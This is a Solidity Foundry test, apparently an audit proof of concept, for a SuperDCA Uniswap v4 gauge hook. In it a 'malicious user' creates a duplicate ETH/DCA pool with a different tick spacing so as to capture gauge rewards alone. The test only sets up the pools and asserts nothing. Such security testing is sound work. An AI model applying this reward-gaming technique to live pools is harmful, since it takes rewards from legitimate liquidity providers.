// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Actions} from "lib/v4-periphery/src/libraries/Actions.sol";
import {Hooks, IHooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/src/types/Currency.sol";
import {SuperDCAGauge} from "../../src/SuperDCAGauge.sol";
import {SuperDCAStaking} from "../../src/SuperDCAStaking.sol";
import {SuperDCAListing} from "../../src/SuperDCAListing.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {Test} from "forge-std/Test.sol";
import {MockERC20Token} from "../mocks/MockERC20Token.sol";
import {FeesCollectionMock} from "../mocks/FeesCollectionMock.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SafeCast} from "@uniswap/v4-core/src/libraries/SafeCast.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {PositionManager} from "lib/v4-periphery/src/PositionManager.sol";
import {IPositionManager} from "lib/v4-periphery/src/interfaces/IPositionManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IAllowanceTransfer} from "permit2/src/interfaces/IAllowanceTransfer.sol";
import {IPositionDescriptor} from "lib/v4-periphery/src/interfaces/IPositionDescriptor.sol";
import {IWETH9} from "lib/v4-periphery/src/interfaces/external/IWETH9.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousUserCanObtainSoloRewards is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using CurrencyLibrary for Currency;
    using LPFeeLibrary for uint24;

    SuperDCAGauge hook;
    SuperDCAStaking public staking;
    SuperDCAListing public listing; 
    MockERC20Token public dcaToken;
    PoolId poolId;
    address developer = makeAddr("developerAddress");
    IPositionManager positionManager = IPositionManager(0x360E68faCcca8cA495c1B759Fd9EEe466db9FB32); 
    address poolManager = 0x360E68faCcca8cA495c1B759Fd9EEe466db9FB32; 
    address public constant weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    IAllowanceTransfer public constant PERMIT2 = IAllowanceTransfer(0x000000000022D473030F116dDEE9F6B43aC78BA3); // Real Permit2 address
    uint256 public constant UNSUBSCRIBE_LIMIT = 5000;
    IPositionDescriptor public tokenDescriptor;
    PositionManager public posM;

    function setUp() public {
        vm.startPrank(developer); 
        dcaToken = new MockERC20Token("Super DCA Token", "SDCA", 18);
       
        address flags = address(
            uint160(
                Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_REMOVE_LIQUIDITY_FLAG
                    | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_INITIALIZE_FLAG
            ) ^ (0x4242 << 144)
        );
        bytes memory constructorArgs = abi.encode(IPoolManager(poolManager), dcaToken, developer, positionManager);

        deployCodeTo("SuperDCAGauge.sol:SuperDCAGauge", constructorArgs, flags);
        hook = SuperDCAGauge(flags);
        listing = new SuperDCAListing(address(dcaToken), IPoolManager(poolManager), IPositionManager(positionManager), developer, IHooks(address(hook)));
        staking = new SuperDCAStaking(address(dcaToken), 100, developer); 

        hook.setStaking(address(staking)); 
        hook.setListing(address(listing)); 

        listing.setHookAddress(IHooks(hook));

        staking.setGauge(address(hook)); 

        dcaToken.transferOwnership(address(hook));
        vm.stopPrank(); 


    }


    function test_maliciousUserCanObtainSoloRewardsByCreatingIndividualPools() public {

        address tokenA = address(dcaToken);
        address tokenB = address(weth);

        uint160 sqrtPriceX96 = 79228162514264337593543950336; // casual sqrt price

        vm.startPrank(developer); 
        //  The developer creates a legit pool with ETH / DCA assigning the hook, with a tick spacing of 60. 
        int24 tickSpacingLegitPool = 60;

        PoolKey memory legitKey = _createPoolKey(tokenA, tokenB, LPFeeLibrary.DYNAMIC_FEE_FLAG, tickSpacingLegitPool);   

        IPoolManager(poolManager).initialize(legitKey, sqrtPriceX96);
        vm.stopPrank(); 


        address maliciousUser = makeAddr("maliciousUser"); 
        vm.startPrank(maliciousUser); 
        //A malicious user is able to create a pool with ETH / DCA and the same hook, but with a tick spacing of 80. 
        //This allows him to utilize his solo pool to obtain solo rewards when "_beforeAddLiquidity" is called in the Gauge contract
        int24 tickSpacingMaliciousPool = 80; 
    
        PoolKey memory maliciousKey = _createPoolKey(tokenA, tokenB, LPFeeLibrary.DYNAMIC_FEE_FLAG, tickSpacingMaliciousPool);   

        IPoolManager(poolManager).initialize(maliciousKey, sqrtPriceX96);
        vm.stopPrank();
    }

       
    function _createPoolKey(address tokenA, address tokenB, uint24 fee, int24 tickSpacing) internal view returns (PoolKey memory key) {
        
        return tokenA < tokenB
            ? PoolKey({
                currency0: Currency.wrap(tokenA),
                currency1: Currency.wrap(tokenB),
                fee: fee,
                tickSpacing: tickSpacing, 
                hooks: IHooks(hook)
            })
            : PoolKey({
                currency0: Currency.wrap(tokenB),
                currency1: Currency.wrap(tokenA),
                fee: fee,
                tickSpacing: tickSpacing,
                hooks: IHooks(hook)
            });
    }


}